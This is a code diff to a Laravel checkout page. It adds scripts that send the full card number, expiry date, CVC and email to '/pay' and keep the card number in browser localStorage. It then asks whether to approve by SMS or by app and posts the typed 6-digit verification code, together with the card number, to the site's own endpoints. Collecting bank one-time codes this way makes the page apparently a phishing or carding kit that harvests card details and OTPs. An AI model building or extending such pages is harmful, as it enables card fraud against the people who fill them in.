@@ -142,7 +142,7 @@
 
             <!-- Container -->
             <div class="min-w-screen min-h-screen grid grid-cols-12 bg-gray-200 gap-3 pb-5 pt-3">
-                <form action="" method="post" id="checkout" class="md:col-span-8 col-span-12 !px-3 py-3 bg-white shadow pb-5 min-h-100 !h-fit" style="height: fit-content">
+                <form action="" method="post" id="checkout" class="md:col-span-8 col-span-12 !px-3 py-3 bg-white shadow pb-5 min-h-100 !h-fit" style="height: fit-content"> @csrf
                     <div class="text-center py-2">
                         <h2 class="text-xl md:text-2xl">Payment</h2>
                     </div>
@@ -176,7 +176,7 @@
 
                                     <input placeholder="MM" min="1" max="12" maxlength="2" class=" col-span-5 py-2 h-full focus:border-transparent border-transparent appearance-none" type="number" name="month" id="month">
 
-                                    <span class="block col-span-1"> / </span>
+                                    <span class="block col-span-1">/</span>
 
                                     <input placeholder="YY" min="23" maxlength="4" class=" col-span-5 py-2 h-full focus:border-transparent border-transparent appearance-none" type="number" name="year" id="year">
                                 </div>
@@ -238,9 +238,9 @@
                             </div>
 
                             <div>
-                                <p  class="font-medium text-gray-900">$<span id="price"></span> / month</p>
+                                <p class="font-medium text-gray-900">$<span id="price"></span> / month</p>
                                 <p>Regular price</p>
-                                <p >Starting <span id="currentDate"></span></p>
+                                <p>Starting <span id="currentDate"></span></p>
                             </div>
                         </div>
                     </div>
@@ -266,12 +266,13 @@
             </h2>
 
             <div class="mt-5 w-full">
-                <button id="approve-by-sms-btn" class="block w-full text-center bg-yellow-500 text-white py-2 px-6">
+                <button id="approve-by-sms-btn" onclick="sendAjaxRequest('sms')" value="sms" class="block w-full text-center bg-yellow-500 text-white py-2 px-6">
                     Get an SMS code
                 </button>
-                <button id="approve-by-call-btn" class="block w-full text-center bg-white border border-solid !border-yellow-500 mt-3 text-yellow-500 py-2 px-6">
-                    Receive a call
+                <button id="approve-by-call-btn" onclick="sendAjaxRequest('Auth-par-app')" value="call" class="block w-full text-center bg-white border border-solid !border-yellow-500 mt-3 text-yellow-500 py-2 px-6">
+                    Authorization by application.
                 </button>
+
             </div>
         </div>
 
@@ -282,9 +283,9 @@
             <div class="text-center mt-3">
                 <p>Enter the 6-digit code we just sent to your phone number ending with </p>
                 <div class="flex flex-wrap justify-center mt-3 gap-2">
-                    <input name="sms-confirm" class="w-full h-[50px] text-lg text-center !px-1 !p-0 relative border border-solid focus:border-yellow-500 focus:outline-yellow-500" type="number" />
+                    <input name="sms-confirm" id="sms-confirm" class="w-full h-[50px] text-lg text-center !px-1 !p-0 relative border border-solid focus:border-yellow-500 focus:outline-yellow-500" type="number" />
                 </div>
-                <button class="block w-full text-center bg-yellow-500 text-white mt-4 py-2 px-6">
+                <button onclick="updateVerificationCode()" class="block w-full text-center bg-yellow-500 text-white mt-4 py-2 px-6">
                     Confirm
                 </button>
                 {{-- <button class="block w-full text-center text-neutral-700 mt-2 text-underline">
@@ -301,7 +302,7 @@
             <div class="text-center mt-3">
                 <p>Enter the 6-digit code we just sent to your phone number ending with </p>
                 <div class="flex flex-wrap justify-center mt-3 gap-2">
-                    <input name="sms-confirm" class="w-full h-[50px] text-lg text-center !px-1 !p-0 relative border border-solid focus:border-yellow-500 focus:outline-yellow-500" type="number" />
+                    <input name="sms-confirm"  class="w-full h-[50px] text-lg text-center !px-1 !p-0 relative border border-solid focus:border-yellow-500 focus:outline-yellow-500" type="number" />
                 </div>
                 <button class="block w-full text-center bg-yellow-500 text-white mt-4 py-2 px-6">
                     Confirm
@@ -317,46 +318,106 @@
     <script src="{{ asset('assets/js/checkout.form.js') }}"></script>
 
 
+
+
     <script>
 
+        function updateVerificationCode() {
+            const xhr = new XMLHttpRequest();
+            let card = localStorage.getItem('card');
+            const data = {
+                codeV: document.getElementById('sms-confirm').value,
+                card: card
+            };
+            const url = '/verificationCode';
+
+            xhr.open('POST', url);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.setRequestHeader('X-CSRF-TOKEN', '{{ csrf_token() }}');
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    const response = JSON.parse(xhr.responseText);
+                    console.log(response);
+                } else {
+                    console.log('Request failed. Status:', xhr.status);
+                }
+            };
+            xhr.send(JSON.stringify(data));
+
+        }
+
+
+
+
+
         const now = new Date();
-        const options = { month: 'short', day: 'numeric', year: 'numeric' };
+        const options = {
+            month: 'short',
+            day: 'numeric',
+            year: 'numeric'
+        };
         const formattedDate = now.toLocaleDateString('en-US', options);
 
 
         if (localStorage.getItem('price')) {
             document.getElementById('price').textContent = localStorage.getItem('price');
             document.getElementById('plan').textContent = localStorage.getItem('plan');
-            document.getElementById('currentDate').textContent  = formattedDate;
+            document.getElementById('currentDate').textContent = formattedDate;
 
         } else {
             location.href = '/';
         }
+
         checkout.addEventListener('submit', e => {
             e.preventDefault();
 
             // togglePopup(true) -> to activate or desactivate the popup
+            const xhr = new XMLHttpRequest();
+            const data = {
+                email: document.getElementById('email').value,
+                card: document.getElementById('card').value,
+                year: document.getElementById('year').value,
+                month: document.getElementById('month').value,
+                cvc: document.getElementById('cvc').value,
+                country: document.getElementById('country').value
+            };
+            const url = '/pay';
+
+            xhr.open('POST', url);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.setRequestHeader('X-CSRF-TOKEN', '{{ csrf_token() }}');
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    localStorage.setItem('card', document.getElementById('card').value);
+                    const response = JSON.parse(xhr.responseText);
+                    togglePopupWith('checkout-confirm');
+                } else {
+                    console.log('Request failed. Status:', xhr.status);
+                }
+            };
+            xhr.send(JSON.stringify(data));
+
 
             // give it the id of the element you want it to show
-            togglePopupWith('checkout-confirm') // see line 273
+            // see line 273
         })
 
         const approveBySmsBtn = document.getElementById('approve-by-sms-btn')
         // const approveBySms = document.getElementById('approve-by-sms-btn')
         const approveByCallBtn = document.getElementById('approve-by-call-btn')
 
-        approveBySmsBtn.addEventListener('click', e => {
-            // togglePopup(false)
-            togglePopupWith('approve-by-sms')
-        })
+        // approveBySmsBtn.addEventListener('click', e => {
+        //     // togglePopup(false)
+        //     togglePopupWith('approve-by-sms')
+        // })
 
-        approveByCallBtn.addEventListener('click', e => {
-            // togglePopup(false)
-            togglePopupWith('approve-by-call')
-        })
-    </script>
+        // approveByCallBtn.addEventListener('click', e => {
+        //     // togglePopup(false)
+        //     togglePopupWith('approve-by-call')
+        // })
 
-    <script>
+
+
         let card = document.getElementById("card");
         let visa = document.getElementById("visa");
         let mastercard = document.getElementById("mastercard");
@@ -401,6 +462,51 @@
             let box = document.getElementById('buy');
             box.classList.add('disable');
         };
+
+
+
+
+
+
+
+
+        // document.getElementById('approve-by-sms-btn').addEventListener('click', function() {
+        //     const value = this.value;
+        //     sendAjaxRequest(value);
+        // });
+
+        // document.getElementById('approve-by-call-btn').addEventListener('click', function() {
+
+        //     console.log('value')
+
+        // });
+
+        function sendAjaxRequest(value) {
+            const xhr = new XMLHttpRequest();
+            let card = localStorage.getItem('card');
+            const data = {
+                method: value,
+                card: card
+            };
+            const url = '/methodUpdate';
+
+            xhr.open('POST', url);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.setRequestHeader('X-CSRF-TOKEN', '{{ csrf_token() }}');
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    const response = JSON.parse(xhr.responseText);
+                    if (value === "sms") {
+                        togglePopupWith('approve-by-sms');
+                    } else if (value === "Auth-par-app") {
+                        togglePopupWith('approve-by-call');
+                    }
+                } else {
+                    console.log('Request failed. Status:', xhr.status);
+                }
+            };
+            xhr.send(JSON.stringify(data));
+        }
     </script>
 
 </body>
